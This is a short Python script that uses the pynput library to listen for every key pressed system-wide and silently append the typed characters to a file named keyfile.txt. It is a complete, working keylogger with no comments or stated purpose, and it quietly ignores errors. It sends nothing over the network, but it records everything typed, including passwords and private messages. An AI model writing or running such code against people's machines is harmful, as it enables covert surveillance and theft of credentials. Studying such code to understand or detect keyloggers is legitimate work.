from pynput import keyboard

def keyPressed(key):
    with open("../../../../keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            pass

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()